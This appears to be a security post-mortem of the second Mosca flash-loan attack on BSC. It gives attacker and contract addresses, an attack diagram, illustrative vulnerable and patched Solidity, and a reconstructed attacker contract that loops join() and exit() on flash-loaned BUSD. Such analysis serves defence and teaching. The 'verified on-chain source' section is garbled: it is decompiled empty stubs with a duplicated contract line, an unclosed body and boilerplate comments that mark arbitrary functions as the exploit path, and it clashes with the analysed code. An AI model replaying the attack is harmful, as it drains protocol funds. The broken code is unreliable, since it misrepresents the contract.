# Mosca2 — Flash Loan-Based join/exit Repeat Manipulation: Second Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-17 |
| **Protocol** | Mosca (2nd Attack) |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$37,600 |
| **Attacker** | [0xe763da20...](https://bscscan.com/address/0xe763da20e25103da8e6afa84b6297f87de557419) |
| **Attack Tx** | [0xf13d281d...](https://bscscan.com/tx/0xf13d281d4aa95f1aca457bd17f2531581b0ce918c90905d65934c9e67f6ae0ec) |
| **Vulnerable Contract** | [0xd8791f0c...](https://bscscan.com/address/0xd8791f0c10b831b605c5d48959eb763b266940b9) |
| **Root Cause** | Lack of fund source validation in join/exit functions allows external funds to be treated as legitimate deposits (unpatched after 1st attack) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Mosca2_exp.sol) |

---

## 1. Vulnerability Overview

The Mosca protocol suffered a second attack because the same vulnerability was left unpatched after the first attack (2025-01-10). This time, the attacker used a DODO DPP flash loan to borrow 7,000 BUSD, called the `join()` function 7 times (1,000 BUSD each), and repeated the pattern of over-withdrawing twice via `exit()`. The two attacks exploiting the same vulnerability underscore the urgency and importance of prompt security patching.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: same vulnerability left intact after the 1st attack
// (same root cause as Mosca 1st attack)
function join(uint256 amount) external {
    userBalance[msg.sender] += amount;
    totalDeposits += amount;
    IERC20(BUSD).transferFrom(msg.sender, address(this), amount);
    // No validation that funds originate from a flash loan
    // No reentrancy guard
}

function exit(address currency) external {
    uint256 amount = userBalance[msg.sender];
    userBalance[msg.sender] = 0;
    // Faulty totalDeposits update logic exists
    IERC20(currency).transfer(msg.sender, amount);
}

// ✅ Patched code (fix that should have been applied immediately after 1st attack)
bool private _locked;
modifier nonReentrant() {
    require(!_locked);
    _locked = true;
    _;
    _locked = false;
}
function join(uint256 amount) external nonReentrant {
    require(amount >= MIN_DEPOSIT, "Too small");
    // Record only the actually received amount
    uint256 before = IERC20(BUSD).balanceOf(address(this));
    IERC20(BUSD).transferFrom(msg.sender, address(this), amount);
    uint256 actual = IERC20(BUSD).balanceOf(address(this)) - before;
    userBalance[msg.sender] += actual;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Mosca2_decompiled.sol
contract Mosca2 {
contract Mosca2 {

    // Selector: 0xbf2d9e0b
    function totalRevenue() external view returns (uint256) {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xa9059cbb
    function transfer(address a, uint256 b) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x9858befb
    function adminBalance() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x095bcdb6
    function transfer(address a, uint256 b, uint256 c) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x7e9824ed
    function refByAddr(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xa87430ba
    function users(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x1b8623ee
    function compressSection(uint256 a, uint256 b) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x2da0cd00
    function generateRefCode(address a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x7c08b964
    function changeFeeReceiver(address a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xaaf5bfc3
    function setUSDCAddress(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xa06db7dc
    function gracePeriod() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x18c6203a
    function getReferrer(uint256 a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }


    // This function is part of the exploit path: lack of fund source validation in join/exit functions allows external funds to be treated as legitimate deposits (unpatched after 1st attack)
    function rewardQueue(uint256 a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xf30e69f9
    function admin_WithdrawFees_Mosca(uint256 a, uint8 b) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x68f58b03
    function TAX() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x2f6eb6af
    function setCollectiveCode(address a, uint256 b) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xfe575a87
    function isBlacklisted(address a) external view returns (bool) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xe0324a9d
    function getRefByAddr(address a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xc4c036be
    function ENTERPRISE_TAX() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x55eba868
    function setUSDTAddress(address a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x70a08231
    function balanceOf(address a) external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xb3f00674
    function feeReceiver() external view returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x30521bde
    function tierSizes(uint256 a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xdb2e21bc
    function emergencyWithdraw() external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x464a0e29
    function removeBlacklistedUsers(address[] a) external {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0x5fb3b5a3
    function join(uint256 a, uint256 b, uint8 c, bool d) external {
        // TODO: decompiled logic not implemented
    }


    // This function is part of the exploit path: lack of fund source validation in join/exit functions allows external funds to be treated as legitimate deposits (unpatched after 1st attack)
    function enterprise_tierRewards(uint256 a) external {
        // TODO: decompiled logic not implemented
    }


    // This function is part of the exploit path: lack of fund source validation in join/exit functions allows external funds to be treated as legitimate deposits (unpatched after 1st attack)
    function getRewardQueue() external returns (uint256) {
        // TODO: decompiled logic not implemented
    }

    // Selector: 0xd56e3a80
    function addSeries(address[] a, uint256[] b, uint256[] c, uint256[] d, uint256[] e, uint256[] f, uint256[] g, bool[] h) external {
        // TODO: decompiled logic not implemented
    }

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO DPP Flash Loan: borrow 7,000 BUSD
  │
  ├─→ [2] join() × 7 times (1,000 BUSD each)
  │         └─ Deposit using flash loan funds → no validation
  │
  ├─→ [3] Call exit(FIAT_CURRENCY_1)
  │         └─ Over-withdraw due to incorrect totalDeposits
  │
  ├─→ [4] Call exit(FIAT_CURRENCY_2)
  │         └─ Additional over-withdrawal
  │
  ├─→ [5] Repay flash loan (7,000 BUSD + fee)
  │
  └─→ [6] ~$37,600 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract Mosca2Attacker {
    address constant MOSCA2 = 0xd8791f0c10b831b605c5d48959eb763b266940b9;
    address constant DODO_DPP = /* DODO DPP pool address */;
    address constant BUSD = /* BUSD address */;

    function attack() external {
        // [1] DODO DPP Flash Loan: 7,000 BUSD
        IDODO(DODO_DPP).flashLoan(
            7_000 * 1e18, 0, address(this), ""
        );
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        IERC20(BUSD).approve(MOSCA2, type(uint256).max);

        // [2] join 7 times (1,000 BUSD each)
        for (uint256 i = 0; i < 7; i++) {
            IMosca(MOSCA2).join(1_000 * 1e18);
        }

        // [3] exit with two currencies (over-withdrawal)
        IMosca(MOSCA2).exit(FIAT_CURRENCY_1);
        IMosca(MOSCA2).exit(FIAT_CURRENCY_2);

        // [5] Repay flash loan
        IERC20(BUSD).transfer(DODO_DPP, 7_000 * 1e18 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Lack of fund source validation (external funds treated as legitimate deposits via repeated join/exit calls) |
| **CWE** | CWE-672: Operation on a Resource after Expiration or Release |
| **Attack Vector** | External (flash loan + repeated calls) |
| **DApp Category** | Deposit/Withdrawal Protocol |
| **Impact** | Protocol asset theft |

## 6. Remediation Recommendations

1. **Immediate patching**: After a security incident, review the entire codebase for the same vulnerability pattern and apply fixes immediately
2. **Pause functionality**: Implement a `pause()` mechanism to instantly halt the protocol upon attack detection
3. **Comprehensive audit**: After the 1st attack, a mandatory security audit must be conducted to scan for similar patterns across the codebase
4. **Bug bounty program**: Operate a vulnerability disclosure rewards program to incentivize discovery before exploitation

## 7. Lessons Learned

- Being hit by a second attack exploiting the same vulnerability only 7 days after the first is a stark demonstration of the critical importance of immediate patching.
- The complacent assumption that "the same attack won't happen again" is dangerous. Attackers continuously monitor for unpatched vulnerabilities.
- After an attack occurs, the protocol must be paused promptly, the entire codebase must be reviewed, and only then reopened.